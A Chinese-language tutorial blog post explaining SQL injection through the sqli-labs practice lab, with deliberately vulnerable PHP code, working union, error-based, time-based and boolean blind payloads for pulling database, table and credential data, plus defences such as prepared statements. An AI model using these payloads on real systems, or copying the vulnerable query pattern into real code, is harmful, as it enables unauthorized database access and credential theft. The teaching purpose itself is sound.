#  基础漏洞系列——SQL注入漏洞详解

## 简介：

SQL注入即是指[web应用程序](https://baike.baidu.com/item/web应用程序/2498090)对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的[SQL语句](https://baike.baidu.com/item/SQL语句/5714895)，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。

## 漏洞原理实例：

用户提交数据后，后端服务器将用户提交的**数据带入sql语句对数据库进行操作**，如果没有进行过滤，那么用户提交构造好的特殊语句，就可以**对数据库进行非法的操作**，即引发sql注入，例如以下代码（sqli-labs-1）

```php
//GET方式获取name为id的值赋值给$id变量；
$id=$_GET['id'];

//定义$sql变量，值为下一步要执行的sql语句，将$id变量带入sql语句中；
$sql="SELECT * FROM user WHERE id='$id' LIMIT 0,1"; 

//将上一步定义的$sql变量的值作为sql语句带入数据库查询，并将结果赋值给$result变量，mysql_query为php提供的数据库查询函数；
$result=mysql_query($sql);

//从上一步查询的结果集中去的一行作为数组返回并赋值给$row变量；
$row = mysql_fetch_array($result);

//如果$row值不为空，即数据库查询数据正常，则打印出username和password的值；
	if($row)
	{
  	echo 'Your Login name:'. $row['username'];
  	echo "<br>";
  	echo 'Your Password:' .$row['password'];
  	echo "</font>";
  	}
	else 
	{
	echo '<font color= "#FFFF00">';
	print_r(mysql_error());
	echo "</font>";  
	}
}
```

数据库中有数据如下

![image-20210124221044957](SQL%E6%B3%A8%E5%85%A5/image-20210124221044957.png)

那么用户提交?id=-1，则代入数据库正常查询且正常输出

![image-20210124221235917](SQL%E6%B3%A8%E5%85%A5/image-20210124221235917.png)

但如果用户提交的数据为

```shell
?id=-1' union select 1,2,database() --+
```

那么则会返回我们构造的语句对数据库进行的查询操作返回的值

![image-20210124221406094](SQL%E6%B3%A8%E5%85%A5/image-20210124221406094.png)

我们将两个提交的数据都带入我们后端的执行中对比，如下

```sql
原始语句：SELECT * FROM user WHERE id='$id' LIMIT 0,1
正常带入数据：SELECT * FROM user WHERE id='1' LIMIT 0,1
非法带入数据：SELECT * FROM user WHERE id='-1' union select 1,2,database() --+' LIMIT 0,1

--（注：在执行sql语句时，“--”是sql语句中的注释符，但是使用时--后要有一个空格才能起到注释作用，否则会报错，这里的+号经过处理后会变成空格，用来和后面的单引号分隔开，才能将后面的语句注释。）
```

可以看到，如果没有经过过滤就将用户提交的非法数据带入后端执行的话，真正执行的语句是`SELECT * FROM user WHERE id='-1' union select 1,2,database() -- ' LIMIT 0,1`，而后面被注释的部分不执行，那么就不会引发错误，在查询id字段值为-1没有结果后，就会执行union查询，查询出数据库名并输出，这就是最典型的sql注入。

## 漏洞分类：

就不按照数字型字符型这些来分类了，我认为按照利用方式来分类更容易理解

**有回显** 

```
Union query #联合查询注入，通过union联合查询获取查询结果

Error based #报错注入，通过报错信息获取查询结果
```

**无回显**

```
Boolean based blind #布尔盲注，通过应用返回不同的值判断条件真假
Time based blind #时间盲注，通过不同的时间延迟推断条件真假
```

## 漏洞检测：

#### **手工检测**

提交的参数与数据库交互，参数添加“ ' ”（英文单引号），出现异常（sql语法错误），即存在sql注入，如果无回显，可以通过延时或者布尔盲注来检测是否存在漏洞。

**注：异常报错的原因是因为后台将参数中的单引号带入sql语句进行数据库操作，多了一个单引号引发sql语法错误，所以报错即整明了我们的单引号进入了sql语句执行中。**

#### **工具检测**

使用sqlmap进行检测，这里是下载地址和使用说明[点击跳转](https://github.com/sqlmapproject/sqlmap)

## 漏洞利用：

#### **手工注入**

有回显型构造语句查询数据，无回显型进行盲注，不过比较费时间。

这里就以mysql的数据库，sqli-labs的less-1为例，列出一些常用的语句，如果要详细展开细讲的话，篇幅肯定会特别特别长，一篇文章恐怕各位看官们也看不下去，各位需要用到更多的语句时自行百度即可，如果需要的话后面可以分开出详细的各中注入方式的详解文章。

##### **UNION联合查询注入**

```sql
爆列数：?id=-1' order by n--+(“n”到几不报错则有n-1列)
爆库名：?id=-1' union select 1,2,database() --+
爆表明：?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+
爆列名：?id=-1' union select 1，2，group_concat(column_name) from information_schema.columns where table_name='users' --+
爆数据：?id=-1' union select 1，group_concat(username),group_concat(password) from users --+

注：使用中根据实际需要修改字段数（列数）以及库名表名等，union查询的字段数需要和表中的字段数相同才可以
```

##### **报错注入**

```sql
爆库名：?id=-1’ union select count(*),count(*),concat(‘~’,(select database()),'~',floor(rand()*2)) as a from information_schema.tables group by a--+
爆表名：?id=-1' union select count(*),count(*), concat('~',(select concat(table_name) from information_schema.tables where table_schema=database() limit 3,1),'~',floor(rand(0)*2)) as a from information_schema.tables group by a--+
爆列名：?id=-1' union select count(*),1, concat('~',(select column_name from information_schema.columns where table_name='users' limit 1,1),'~',floor(rand(0)*2)) as a from information_schema.tables group by a--+
爆数据：?id=-1' union select count(*),1, concat('~',(select concat_ws(':',username,password) from users limit 1,1),'~',floor(rand(0)*2)) as a from information_schema.tables group by a--+
```

##### **时间盲注**

```sql
爆库长：?id=1' and if(length(database())=8,sleep(5),NULL)--+
爆库名：?id=1' and if(left(database(),1)='s',sleep(5),NULL)--+
爆表名：?id=1' and if(left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)='r',sleep(5),NULL)--+
爆列明：?id=1' and if(left((select column_name from information_schema.columns where table_name = 'users' limit 1,1),8)='username',sleep(5),NULL)--+
爆数据：?id=1' and if(left((select username from users order by id limit 0,1),4)='dumb',sleep(5),NULL)--+
?id=1' and if(left((select password from users order by id limit 0,1),4)='dumb',sleep(5),NULL)--+

```

##### **布尔盲注**

```sql
爆库名：?id=1' and left((select database()),1)='s'--+
爆表名：?id=1' and left((select table_name from information_schema.tables where table_schema ='security' limit 3,1),5)='users'--+
爆列明：?id=1' and left((select column_name from information_schema.columns where table_name='users' limit 1,1),8)='username'--+
爆数据：?id=1' and left((select username from users order by id limit 0,1),4)='dumb'--+
```

无回显的还有一种利用方式是利用DNSlog外带查询的内容，这里有一位师傅讲的已经很详细了，[点击查看原文](https://www.anquanke.com/post/id/98096)

以上为GET型注入，POST型类似，修改参数值即可。

#### **工具注入**

依旧是sqlmap一把梭，实战中根据实际需求使用tamper进行绕过一些过滤。

## 常见场景：

用户可控的参数与数据库有交互的地方，常见与查询，登录等；

在测试中可以爬取网站的一些api查询接口，也会存在sql注入。

## 漏洞防御：

#### WAF（web应用防火墙）

为网站添加waf，虽然不能修复sql注入漏洞，但是可以拦截敏感数据以防止sql注入被黑客利用

#### Filter过滤

在服务器端添加过滤代码以过滤可能引发sql注入的敏感字符

#### sql预编译

示例：

```sql
prepare baizesec from 'select username,password from users where id=？'; 定义预编译语句
set @a=1; 传参数
execute baizesec using @a; 调用
```

